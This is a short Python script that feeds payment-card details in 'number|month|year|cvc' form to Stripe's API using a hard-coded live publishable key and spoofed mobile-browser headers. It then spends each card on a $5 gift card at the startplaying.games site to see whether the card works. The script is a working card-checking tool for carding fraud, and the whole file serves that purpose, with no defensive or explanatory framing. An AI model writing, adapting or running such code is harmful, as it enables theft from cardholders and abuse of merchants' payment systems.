import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F9e39ef88d1%3B+stripe-js-v3%2F9e39ef88d1%3B+card-element&key=pk_live_7ah6gSa8oGIcTyDOseamKDhP00cU80tIPI'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'startplaying.games',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://startplaying.games',
	    'referer': 'https://startplaying.games/gift-card',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'operationName': 'PurchaseGiftCardMutation',
	    'variables': {
	        'input': {
	            'credit': 5,
	            'email': 'rodamuser08@gmail.com',
	            'name': 'Elody',
	            'reason': 'Enjoy!!',
	            'recipientEmail': 'rodamuser09@gmail.com',
	            'recipientName': 'Rosy',
	            'stripePaymentMethodId': f'{pm}',
	        },
	    },
	    'query': 'mutation PurchaseGiftCardMutation($input: CreateGiftCardTransactionInput!) {\n  createGiftCardTransaction(input: $input) {\n    id\n    amount\n    created\n    credit\n    modified\n    payoutDate\n    player {\n      id\n      name\n      __typename\n    }\n    reason\n    relatedUser {\n      id\n      name\n      __typename\n    }\n    slug\n    stripePaymentId\n    type\n    __typename\n  }\n}',
	}
	
	response = requests.post('https://startplaying.games/api/graphql', headers=headers, json=json_data)
	
	return (response.text)
